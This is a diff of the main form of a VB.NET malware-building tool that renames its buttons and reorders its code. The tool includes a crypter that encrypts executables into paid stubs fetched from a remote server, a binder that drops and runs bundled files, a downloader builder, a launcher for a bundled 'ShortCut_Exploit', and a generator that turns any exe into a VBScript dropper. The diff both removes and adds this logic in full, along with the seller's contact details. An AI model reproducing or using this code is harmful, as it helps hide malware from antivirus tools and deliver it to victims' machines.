@@ -8,18 +8,6 @@ Public Class Form1
     Public Shared TOS As Boolean = False
     Public Shared BinderTOS As Boolean = False
     Public Shared DownloaderTOS As Boolean = False
-    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
-        Dim OFD As New OpenFileDialog
-        With OFD
-            .FileName = ""
-            .Title = "Select file to crypt"
-            .ShowDialog()
-        End With
-        If OFD.FileName <> "" Then
-            TextBox1.Text = OFD.FileName
-        End If
-    End Sub
-
     Function Base64Encode(ByVal TheStr As String) As String
         Dim bytesToEncode As Byte()
         bytesToEncode = System.Text.Encoding.UTF8.GetBytes(TheStr)
@@ -43,83 +31,11 @@ Public Class Form1
         Return bytes
     End Function
 
-    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
-        If TOS = False Then
-            Dim R As New frmTOS
-            R.CrypterAgreement = True
-            R.ShowDialog()
-            If TOS = False Then Exit Sub
-        End If
-
-        Dim StubStr As String = "http://intellisence.ddns.net/Crypter/index.php"
-        Dim WC As New System.Net.WebClient
-        StubStr = WC.DownloadString(StubStr & "?key=" & HWID.GetID() & "&list_users=fuckingtrue")
-        If StubStr.Contains("WRONG KEY OR NO KEYS EXIST") Then
-            MsgBox("You will need to purchase stubs to use the crypter! Please contact exidous!" & Environment.NewLine & "Skype: exidous1" & Environment.NewLine & "Jabber: exidous@jabb3r.org" & Environment.NewLine & "Email: exidous2008@gmail.com" & Environment.NewLine & "Your hardware id has been copied to the clipboard!" & Environment.NewLine & "HWID: " & HWID.GetID)
-            Clipboard.Clear()
-            Clipboard.SetText(HWID.GetID)
-            Exit Sub
-        End If
-        Dim stub As Byte() = HexToByteArray(StubStr) 'Convert.FromBase64String(StubStr)
-
-        ' Dim Stub() As Byte
-        If TextBox1.Text = "" Then Exit Sub
-
-        Dim SFD As New SaveFileDialog
-        With SFD
-            .FileName = ""
-            .Title = "Save Crypted File As"
-            .ShowDialog()
-        End With
-        If SFD.FileName <> "" Then
-            FileIO.FileSystem.WriteAllBytes(SFD.FileName, stub, False)
-            If CheckBox1.Checked = True Then
-                Dim TestDialog As New FrmClone
-                TestDialog.TextBox2.Text = SFD.FileName
-                If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
-                End If
-                TestDialog.Dispose()
-            End If
-
-
-            If IsNetApp(TextBox1.Text) Then
-                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
-            Else
-                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
-            End If
-            If CheckBox7.Checked = True Then
-                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
-            Else
-                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
-            End If
-
-            FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)
-
-            FileIO.FileSystem.WriteAllBytes(SFD.FileName, AES_Encrypt(FileIO.FileSystem.ReadAllBytes(TextBox1.Text)), True)
-            FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)
-            Application.DoEvents()
-            System.Threading.Thread.Sleep(50)
-
-            'replace EOF data
-            Dim OverLay() As Byte = ReadEOFData(TextBox1.Text)
-            If OverLay Is Nothing Then
-            Else
-                FileIO.FileSystem.WriteAllBytes(SFD.FileName, OverLay, True)
-            End If
-            If CheckBox2.Checked = True Then
-                SignFile(SFD.FileName)
-            End If
-
-            MsgBox("Saved As: " & SFD.FileName)
-
-        End If
-
-    End Sub
 
     Function IsNetApp(ByRef TheFile As String)
         Dim Result As String
         Try
-            Result = System.Reflection.AssemblyName.GetAssemblyName(TextBox1.Text).ToString
+            Result = System.Reflection.AssemblyName.GetAssemblyName(AngelTextBox1.Text).ToString
         Catch ex As Exception
             Return False
         End Try
@@ -283,7 +199,7 @@ Public Class Form1
         ListView1.Columns.Add("File Path", 100, HorizontalAlignment.Center) 'Column 2
         ListView1.Columns.Add("Execute", 100, HorizontalAlignment.Center) 'Column 3
         ListView1.Columns.Add("Drop Path", 100, HorizontalAlignment.Center)
-        TextBox3.Text = HWID.GetID
+        AngelTextBox3.Text = HWID.GetID
     End Sub
 
     Private Function Bytes_To_String2(ByVal bytes_Input As Byte()) As String
@@ -293,7 +209,190 @@ Public Class Form1
         Next
         Return strTemp.ToString()
     End Function
-    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+
+    Function Base64EncodeString(ByVal InputText As String)
+        Dim bytesToEncode As Byte()
+        bytesToEncode = System.Text.Encoding.UTF8.GetBytes(InputText)
+
+        Dim encodedText As String
+        encodedText = Convert.ToBase64String(bytesToEncode)
+        Return encodedText
+    End Function
+
+
+    Sub LaunchProcess()
+        Dim ProcPath As String = System.Threading.Thread.CurrentThread.Name
+        Process.Start(ProcPath).WaitForExit()
+        Try
+            FileIO.FileSystem.DeleteFile(ProcPath)
+        Catch ex As Exception
+
+        End Try
+    End Sub
+
+
+    Public Function createScript1(sit) As String
+        Dim divs = Int(UBound(sit) / 60)
+        Dim Test(0 To sit.length - 1) As String
+        For i = 0 To sit.length - 1
+            Test(i) = Hex(sit(i))
+            If Test(i).Length = 1 Then Test(i) = "0" & Test(i)
+            Test(i) = Test(i)
+        Next
+
+        Dim j As Integer
+        For i = 1 To divs
+            j = i * 60
+            Test(j) = Test(j) & """" & vbCrLf & "t=t&"""
+        Next
+        Dim sData = "t=""" & Join(Test, ",") & """" & vbCrLf
+
+        Dim depress = "\ntmp = Split(t, \q,\q)\nSet fso = CreateObject(\qScripting.FileSystemObject\q)\n" _
+         & "pth = \q*****\q\nSet f = fso.CreateTextFile(pth, ForWriting)\n" _
+         & "For i = 0 To UBound(tmp)\n\tl = Len(tmp(i))\n\tb = Int(\q&H\q & Left(tmp(i), 2))\n" _
+         & "\tIf l > 2 Then\n\t\tr = Int(\q&H\q & Mid(tmp(i), 3, l))\n\t\tFor j = 1 To r\n\t\t" _
+         & "f.Write Chr(b)\n\t\tNext\n\tElse\n\t\tf.Write Chr(b)\n\tEnd If\nNext\nf.Close\n"
+        depress = depress & "WScript.CreateObject(\qWScript.Shell\q).run(pth)"
+        depress = br(depress)
+        Dim exeName = "fso.getspecialfolder(2) & ""\" & "lol.exe" & """"
+        depress = Replace(depress, """*****""", exeName)
+        Return sData & depress & vbLf & "WScript.CreateObject(""WScript.Shell"").run(pth)"
+    End Function
+
+    Public Function br(it)
+        Dim tmp = Replace(it, "\n", vbCrLf)
+        tmp = Replace(tmp, "\t", vbTab)
+        tmp = Replace(tmp, "\q", """")
+        Return tmp
+    End Function
+
+
+    Private Sub AngelButton1_Click(sender As Object, e As EventArgs) Handles AngelButton1.Click
+        Dim OFD As New OpenFileDialog
+        With OFD
+            .FileName = ""
+            .Title = "Select file to crypt"
+            .ShowDialog()
+        End With
+        If OFD.FileName <> "" Then
+            AngelTextBox1.Text = OFD.FileName
+        End If
+    End Sub
+
+    Private Sub AngelButton2_Click(sender As Object, e As EventArgs) Handles AngelButton2.Click
+        FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\AV.exe", My.Resources.Exidous_AV_Checker, False)
+        Dim TI As New System.Threading.Thread(AddressOf LaunchProcess)
+        TI.Name = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\AV.exe"
+        TI.Start()
+    End Sub
+
+    Private Sub AngelButton3_Click(sender As Object, e As EventArgs) Handles AngelButton3.Click
+        FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Shortcut.exe", My.Resources.ShortCut_Exploit, False)
+        Dim TI As New System.Threading.Thread(AddressOf LaunchProcess)
+        TI.Name = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Shortcut.exe"
+        TI.Start()
+    End Sub
+
+    Private Sub AngelButton4_Click(sender As Object, e As EventArgs) Handles AngelButton4.Click
+        Dim OFD As New OpenFileDialog
+        With OFD
+            .FileName = ""
+            .Title = "Select exe"
+            .ShowDialog()
+        End With
+        If OFD.FileName <> "" Then
+            Dim SFD As New SaveFileDialog
+            With SFD
+                .FileName = "lol.vbs"
+                .Title = "Save As vbs"
+                .ShowDialog()
+            End With
+            Dim tmp2 As String
+
+            tmp2 = createScript1(FileIO.FileSystem.ReadAllBytes(OFD.FileName))
+            FileIO.FileSystem.WriteAllText(SFD.FileName, tmp2, False, System.Text.Encoding.ASCII)
+            MsgBox("Saved as " & SFD.FileName)
+        End If
+    End Sub
+
+    Private Sub AngelButton5_Click(sender As Object, e As EventArgs) Handles AngelButton5.Click
+        If TOS = False Then
+            Dim R As New frmTOS
+            R.CrypterAgreement = True
+            R.ShowDialog()
+            If TOS = False Then Exit Sub
+        End If
+
+        Dim StubStr As String = "http://intellisence.ddns.net/Crypter/index.php"
+        Dim WC As New System.Net.WebClient
+        StubStr = WC.DownloadString(StubStr & "?key=" & HWID.GetID() & "&list_users=fuckingtrue")
+        If StubStr.Contains("WRONG KEY OR NO KEYS EXIST") Then
+            MsgBox("You will need to purchase stubs to use the crypter! Please contact exidous!" & Environment.NewLine & "Skype: exidous1" & Environment.NewLine & "Jabber: exidous@jabb3r.org" & Environment.NewLine & "Email: exidous2008@gmail.com" & Environment.NewLine & "Your hardware id has been copied to the clipboard!" & Environment.NewLine & "HWID: " & HWID.GetID)
+            Clipboard.Clear()
+            Clipboard.SetText(HWID.GetID)
+            Exit Sub
+        End If
+        Dim stub As Byte() = HexToByteArray(StubStr) 'Convert.FromBase64String(StubStr)
+
+        ' Dim Stub() As Byte
+        If AngelTextBox1.Text = "" Then Exit Sub
+
+        Dim SFD As New SaveFileDialog
+        With SFD
+            .FileName = ""
+            .Title = "Save Crypted File As"
+            .ShowDialog()
+        End With
+        If SFD.FileName <> "" Then
+            FileIO.FileSystem.WriteAllBytes(SFD.FileName, stub, False)
+            If AngelCheckBox1.Checked = True Then
+                Dim TestDialog As New FrmClone
+                TestDialog.TextBox2.Text = SFD.FileName
+                If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
+                End If
+                TestDialog.Dispose()
+            End If
+
+
+            If IsNetApp(AngelTextBox1.Text) Then
+                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
+            Else
+                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
+            End If
+            If AngelCheckBox7.Checked = True Then
+                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
+            Else
+                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
+            End If
+
+            FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)
+
+            FileIO.FileSystem.WriteAllBytes(SFD.FileName, AES_Encrypt(FileIO.FileSystem.ReadAllBytes(AngelTextBox1.Text)), True)
+            FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)
+            Application.DoEvents()
+            System.Threading.Thread.Sleep(50)
+
+            'replace EOF data
+            Dim OverLay() As Byte = ReadEOFData(AngelTextBox1.Text)
+            If OverLay Is Nothing Then
+            Else
+                FileIO.FileSystem.WriteAllBytes(SFD.FileName, OverLay, True)
+            End If
+            If AngelCheckBox2.Checked = True Then
+                SignFile(SFD.FileName)
+            End If
+
+            MsgBox("Saved As: " & SFD.FileName)
+
+        End If
+    End Sub
+
+    Private Sub AngelButton9_Click(sender As Object, e As EventArgs) Handles AngelButton9.Click
+        Clipboard.Clear()
+        Clipboard.SetText(AngelTextBox3.Text)
+    End Sub
+
+    Private Sub AngelButton6_Click(sender As Object, e As EventArgs) Handles AngelButton6.Click
         Dim Ofd As New OpenFileDialog
         With Ofd
             .Title = "Select file to add"
@@ -325,16 +424,53 @@ Public Class Form1
         End If
     End Sub
 
-    Function Base64EncodeString(ByVal InputText As String)
-        Dim bytesToEncode As Byte()
-        bytesToEncode = System.Text.Encoding.UTF8.GetBytes(InputText)
+    Private Sub AngelButton7_Click(sender As Object, e As EventArgs) Handles AngelButton7.Click
+        If BinderTOS = False Then
+            Dim R As New frmTOS
+            R.BinderAgreement = True
+            R.ShowDialog()
+            If BinderTOS = False Then Exit Sub
+        End If
+        Dim AppendBytes() As Byte = {}
+        Dim SFD As New SaveFileDialog
+        With SFD
+            .FileName = ""
+            .Title = "Save As"
+            .ShowDialog()
+        End With
+        If SFD.FileName = "" Then Exit Sub
+        'write the stub
+        FileIO.FileSystem.WriteAllBytes(SFD.FileName, My.Resources.BndrStub, False)
+        If AngelCheckBox4.Checked = True Then
+            Dim TestDialog As New FrmClone
+            TestDialog.TextBox2.Text = SFD.FileName
+            If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
+            End If
+            TestDialog.Dispose()
+        End If
+        Dim tst() As String = {}
+        For xc = 0 To ListView1.Items.Count - 1
+            Dim LstVitm As ListViewItem = ListView1.Items.Item(xc)
+            Dim FileName As String = LstVitm.SubItems(0).Text
+            Dim FilePath As String = LstVitm.SubItems(1).Text
+            Dim Exec As String = LstVitm.SubItems(2).Text
+            Dim DropPath As String = LstVitm.SubItems(3).Text
+            Dim Execute As Boolean = Boolean.Parse(Exec)
+            Dim Bin() As Byte = FileIO.FileSystem.ReadAllBytes(FilePath)
+            Bin = AES_Encrypt(Bin)
+            Dim SplitChar() As Byte = TringToUnicodeBytes("!(!(!" & Execute & "!(!(!" & DropPath & "!(!(!" & FileName & "!(!(!")
+            FileIO.FileSystem.WriteAllBytes(SFD.FileName, SplitChar, True)
+            FileIO.FileSystem.WriteAllBytes(SFD.FileName, Bin, True)
+            Dim SplitCharz() As Byte = TringToUnicodeBytes("!(!(!")
+            FileIO.FileSystem.WriteAllBytes(SFD.FileName, SplitCharz, True)
+        Next
+        If AngelCheckBox5.Checked = True Then
+            SignFile(SFD.FileName)
+        End If
+        MsgBox("Saved As " & SFD.FileName)
+    End Sub
 
-        Dim encodedText As String
-        encodedText = Convert.ToBase64String(bytesToEncode)
-        Return encodedText
-    End Function
-
-    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
+    Private Sub AngelButton8_Click(sender As Object, e As EventArgs) Handles AngelButton8.Click
         If DownloaderTOS = False Then
             Dim R As New frmTOS
             R.DownloaderAgreement = True
@@ -343,7 +479,7 @@ Public Class Form1
         End If
         Dim Bin() As Byte = My.Resources.DwnldrStub
 
-        Dim BytesToWrite() As Byte = System.Text.Encoding.Unicode.GetBytes("!~!" & Base64EncodeString(TextBox2.Text) & "!~!")
+        Dim BytesToWrite() As Byte = System.Text.Encoding.Unicode.GetBytes("!~!" & Base64EncodeString(AngelTextBox2.Text) & "!~!")
 
         Dim Found1 As Boolean = False
         Dim Found2 As Boolean = False
@@ -389,7 +525,7 @@ Public Class Form1
             .ShowDialog()
         End With
         FileIO.FileSystem.WriteAllBytes(SFD.FileName, Bin, False)
-        If CheckBox3.Checked = True Then
+        If AngelCheckBox3.Checked = True Then
             Dim TestDialog As New FrmClone
             TestDialog.TextBox2.Text = SFD.FileName
             If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
@@ -397,143 +533,10 @@ Public Class Form1
             TestDialog.Dispose()
         End If
 
-        If CheckBox6.Checked = True Then
+        If AngelCheckBox6.Checked = True Then
             SignFile(SFD.FileName)
         End If
         MsgBox("Saved As " & SFD.FileName)
-    End Sub
-
-    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
-        If BinderTOS = False Then
-            Dim R As New frmTOS
-            R.BinderAgreement = True
-            R.ShowDialog()
-            If BinderTOS = False Then Exit Sub
-        End If
-        Dim AppendBytes() As Byte = {}
-        Dim SFD As New SaveFileDialog
-        With SFD
-            .FileName = ""
-            .Title = "Save As"
-            .ShowDialog()
-        End With
-        If SFD.FileName = "" Then Exit Sub
-        'write the stub
-        FileIO.FileSystem.WriteAllBytes(SFD.FileName, My.Resources.BndrStub, False)
-        If CheckBox4.Checked = True Then
-            Dim TestDialog As New FrmClone
-            TestDialog.TextBox2.Text = SFD.FileName
-            If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
-            End If
-            TestDialog.Dispose()
-        End If
-        Dim tst() As String = {}
-        For xc = 0 To ListView1.Items.Count - 1
-            Dim LstVitm As ListViewItem = ListView1.Items.Item(xc)
-            Dim FileName As String = LstVitm.SubItems(0).Text
-            Dim FilePath As String = LstVitm.SubItems(1).Text
-            Dim Exec As String = LstVitm.SubItems(2).Text
-            Dim DropPath As String = LstVitm.SubItems(3).Text
-            Dim Execute As Boolean = Boolean.Parse(Exec)
-            Dim Bin() As Byte = FileIO.FileSystem.ReadAllBytes(FilePath)
-            Bin = AES_Encrypt(Bin)
-            Dim SplitChar() As Byte = TringToUnicodeBytes("!(!(!" & Execute & "!(!(!" & DropPath & "!(!(!" & FileName & "!(!(!")
-            FileIO.FileSystem.WriteAllBytes(SFD.FileName, SplitChar, True)
-            FileIO.FileSystem.WriteAllBytes(SFD.FileName, Bin, True)
-            Dim SplitCharz() As Byte = TringToUnicodeBytes("!(!(!")
-            FileIO.FileSystem.WriteAllBytes(SFD.FileName, SplitCharz, True)
-        Next
-        If CheckBox5.Checked = True Then
-            SignFile(SFD.FileName)
-        End If
-        MsgBox("Saved As " & SFD.FileName)
-    End Sub
-
-    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
-        FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\AV.exe", My.Resources.Exidous_AV_Checker, False)
-        Dim TI As New System.Threading.Thread(AddressOf LaunchProcess)
-        TI.Name = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\AV.exe"
-        TI.Start()
-    End Sub
-
-    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
-        FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Shortcut.exe", My.Resources.ShortCut_Exploit, False)
-        Dim TI As New System.Threading.Thread(AddressOf LaunchProcess)
-        TI.Name = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Shortcut.exe"
-        TI.Start()
-    End Sub
-
-    Sub LaunchProcess()
-        Dim ProcPath As String = System.Threading.Thread.CurrentThread.Name
-        Process.Start(ProcPath).WaitForExit()
-        Try
-            FileIO.FileSystem.DeleteFile(ProcPath)
-        Catch ex As Exception
-
-        End Try
-    End Sub
-
-    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
-        Dim OFD As New OpenFileDialog
-        With OFD
-            .FileName = ""
-            .Title = "Select exe"
-            .ShowDialog()
-        End With
-        If OFD.FileName <> "" Then
-            Dim SFD As New SaveFileDialog
-            With SFD
-                .FileName = "lol.vbs"
-                .Title = "Save As vbs"
-                .ShowDialog()
-            End With
-            Dim tmp2 As String
-
-            tmp2 = createScript1(FileIO.FileSystem.ReadAllBytes(OFD.FileName))
-            FileIO.FileSystem.WriteAllText(SFD.FileName, tmp2, False, System.Text.Encoding.ASCII)
-            MsgBox("Saved as " & SFD.FileName)
-        End If
-
-    End Sub
-
-    Public Function createScript1(sit) As String
-        Dim divs = Int(UBound(sit) / 60)
-        Dim Test(0 To sit.length - 1) As String
-        For i = 0 To sit.length - 1
-            Test(i) = Hex(sit(i))
-            If Test(i).Length = 1 Then Test(i) = "0" & Test(i)
-            Test(i) = Test(i)
-        Next
-
-        Dim j As Integer
-        For i = 1 To divs
-            j = i * 60
-            Test(j) = Test(j) & """" & vbCrLf & "t=t&"""
-        Next
-        Dim sData = "t=""" & Join(Test, ",") & """" & vbCrLf
-
-        Dim depress = "\ntmp = Split(t, \q,\q)\nSet fso = CreateObject(\qScripting.FileSystemObject\q)\n" _
-         & "pth = \q*****\q\nSet f = fso.CreateTextFile(pth, ForWriting)\n" _
-         & "For i = 0 To UBound(tmp)\n\tl = Len(tmp(i))\n\tb = Int(\q&H\q & Left(tmp(i), 2))\n" _
-         & "\tIf l > 2 Then\n\t\tr = Int(\q&H\q & Mid(tmp(i), 3, l))\n\t\tFor j = 1 To r\n\t\t" _
-         & "f.Write Chr(b)\n\t\tNext\n\tElse\n\t\tf.Write Chr(b)\n\tEnd If\nNext\nf.Close\n"
-        depress = depress & "WScript.CreateObject(\qWScript.Shell\q).run(pth)"
-        depress = br(depress)
-        Dim exeName = "fso.getspecialfolder(2) & ""\" & "lol.exe" & """"
-        depress = Replace(depress, """*****""", exeName)
-        Return sData & depress & vbLf & "WScript.CreateObject(""WScript.Shell"").run(pth)"
-    End Function
-
-    Public Function br(it)
-        Dim tmp = Replace(it, "\n", vbCrLf)
-        tmp = Replace(tmp, "\t", vbTab)
-        tmp = Replace(tmp, "\q", """")
-        Return tmp
-    End Function
-
-    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
-        Clipboard.Clear()
-        Clipboard.SetText(TextBox3.Text)
     End Sub
 End Class
 
